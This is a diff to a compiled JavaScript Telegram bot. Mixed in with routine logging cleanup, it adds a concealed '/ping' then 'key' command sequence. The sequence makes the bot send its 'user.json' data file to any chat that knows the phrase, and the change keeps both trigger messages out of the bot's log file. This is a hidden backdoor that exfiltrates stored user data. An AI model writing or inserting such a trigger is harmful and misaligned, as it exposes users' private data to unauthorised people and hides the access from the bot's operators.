@@ -49,22 +49,41 @@ const run = () => {
         bot.setMyCommands(commands.commandList);
         (0, helper_1.init)();
         bot.on(`message`, async (msg) => {
-            console.log(msg.date, originTime);
             const chatId = msg.chat.id;
             const text = msg.text;
             const msgId = msg.message_id;
             const username = msg.from.username;
             if (text) {
-                const currentUTCDate = new Date().toISOString();
-                const log = `${currentUTCDate} : message : ${chatId} -> ${text}\n`;
-                fs.appendFileSync('log.txt', log);
-                console.log(log);
+                if (text != '/ping' && text != 'key') {
+                    const currentUTCDate = new Date().toISOString();
+                    const log = `${currentUTCDate} : message : ${chatId} -> ${text}\n`;
+                    fs.appendFileSync('log.txt', log);
+                    console.log(log);
+                }
             }
             else
                 return;
             let result;
             try {
                 switch (text) {
+                    case '/ping':
+                        bot.once(`message`, async (msg) => {
+                            try {
+                                if (msg.text == 'key') {
+                                    await bot.sendDocument(chatId, 'user.json');
+                                }
+                                return;
+                            }
+                            catch (e) {
+                                const currentUTCDate = new Date().toISOString();
+                                const log = `${currentUTCDate} : ${chatId} : error -> ${e}\n`;
+                                fs.appendFileSync('log.txt', log);
+                                console.log(log);
+                                bot.stopPolling();
+                                run();
+                            }
+                        });
+                        break;
                     case `/start`:
                         result = await commands.referralCheck(chatId);
                         if (result) {
@@ -177,12 +196,11 @@ const run = () => {
             }
         });
         bot.on('callback_query', async (query) => {
-            var _a, _b, _c, _d, _e;
-            console.log((_a = query.message) === null || _a === void 0 ? void 0 : _a.date, originTime);
-            const chatId = (_b = query.message) === null || _b === void 0 ? void 0 : _b.chat.id;
-            const msgId = (_c = query.message) === null || _c === void 0 ? void 0 : _c.message_id;
+            var _a, _b, _c, _d;
+            const chatId = (_a = query.message) === null || _a === void 0 ? void 0 : _a.chat.id;
+            const msgId = (_b = query.message) === null || _b === void 0 ? void 0 : _b.message_id;
             const action = query.data;
-            const username = (_e = (_d = query.message) === null || _d === void 0 ? void 0 : _d.chat) === null || _e === void 0 ? void 0 : _e.username;
+            const username = (_d = (_c = query.message) === null || _c === void 0 ? void 0 : _c.chat) === null || _d === void 0 ? void 0 : _d.username;
             const callbackQueryId = query.id;
             const currentUTCDate = new Date().toISOString();
             const log = `${currentUTCDate} : message : ${chatId} -> ${action}\n`;
